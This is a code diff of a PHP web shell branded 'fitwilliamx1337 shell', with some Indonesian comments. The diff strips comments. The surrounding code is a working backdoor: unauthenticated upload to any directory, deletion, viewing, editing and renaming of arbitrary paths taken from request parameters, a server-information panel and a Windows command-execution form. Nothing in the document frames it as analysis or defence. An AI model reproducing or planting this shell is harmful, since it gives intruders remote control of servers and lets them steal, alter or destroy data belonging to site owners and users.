@@ -1,12 +1,9 @@
 <?php
 session_start();
 
-// FUNGSI UPLOAD YANG DIPERBAIKI - BISA UPLOAD DARI DIRECTORY LAIN
 if (isset($_FILES['file_upload'])) {
-    // Bisa pilih direktori tujuan dari parameter upload_dir
     $uploadDir = isset($_POST['upload_dir']) && !empty($_POST['upload_dir']) ? $_POST['upload_dir'] : getcwd();
     
-    // Validasi direktori
     if (!is_dir($uploadDir)) {
         $uploadDir = getcwd();
         echo '<p style="color: orange;">Directory not found, using current directory.</p>';
@@ -23,7 +20,6 @@ if (isset($_FILES['file_upload'])) {
     }
 }
 
-// Fungsi delete directory
 function deleteDirectory($dir) {
     if (!is_dir($dir)) return false;
     
@@ -120,7 +116,6 @@ function deleteDirectory($dir) {
 <body>
     <h1>fitwilliamx1337 shell  |   <a href="https://instagram.com/fitwilliamx1337">> Contact me < </a></h1>
     
-    <!-- System Information Section -->
     <div class="system-info">
         <p><strong>SERVER IP:</strong> <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unavailable'; ?></p>
         <p><strong>YOUR IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
@@ -147,7 +142,6 @@ function deleteDirectory($dir) {
         </p>
     </div>
 
-    <!-- UPLOAD FORM - BISA UPLOAD KE DIRECTORY MANAPUN -->
     <div class="upload-form">
         <h2>Upload File</h2>
         <form method="post" enctype="multipart/form-data">
@@ -190,7 +184,6 @@ function deleteDirectory($dir) {
         ?>
     </div>
 
-    <!-- Buat Directory Baru -->
     <h2>Buat Directory</h2>
     <form method="POST">
         <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8'); ?>">
@@ -208,7 +201,6 @@ function deleteDirectory($dir) {
     }
     ?>
 
-    <!-- Directory List -->
     <h2>Directory List</h2>
     <?php
     $files = scandir($currentDir);
@@ -237,7 +229,6 @@ function deleteDirectory($dir) {
     echo '</div>';
     ?>
 
-    <!-- File List -->
     <h2>File List</h2>
     <?php
     echo '<div class="file-list">';
@@ -256,9 +247,7 @@ function deleteDirectory($dir) {
     echo '</div>';
     ?>
 
-    <!-- Fungsi Delete, Rename, View, Edit -->
     <?php
-    // Delete Directory
     if (isset($_GET['delete_dir'])) {
         $deleteDirPath = $_GET['delete_dir'];
         if (is_dir($deleteDirPath)) {
@@ -270,7 +259,6 @@ function deleteDirectory($dir) {
         }
     }
 
-    // Delete File
     if (isset($_GET['delete'])) {
         $deletePath = $_GET['delete'];
         if (is_file($deletePath) && unlink($deletePath)) {
@@ -280,7 +268,6 @@ function deleteDirectory($dir) {
         }
     }
 
-    // View File
     if (isset($_GET['view'])) {
         $viewPath = $_GET['view'];
         if (is_file($viewPath)) {
@@ -290,7 +277,6 @@ function deleteDirectory($dir) {
         }
     }
 
-    // Edit File
     if (isset($_GET['edit'])) {
         $editPath = $_GET['edit'];
         if (is_file($editPath)) {
@@ -308,7 +294,6 @@ function deleteDirectory($dir) {
         }
     }
 
-    // Rename Directory
     if (isset($_GET['rename_dir'])) {
         $renameDirPath = $_GET['rename_dir'];
         if (is_dir($renameDirPath)) {
@@ -329,7 +314,6 @@ function deleteDirectory($dir) {
         }
     }
 
-    // Rename File
     if (isset($_GET['rename'])) {
         $renameFilePath = $_GET['rename'];
         if (is_file($renameFilePath)) {
@@ -351,7 +335,6 @@ function deleteDirectory($dir) {
     }
     ?>
 
-    <!-- CMD Section -->
     <h2>CMD [ Windows ]</h2>
     <form method="GET">
         <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8'); ?>">
@@ -368,4 +351,5 @@ function deleteDirectory($dir) {
     ?>
     </pre>
 </body>
+
 </html>
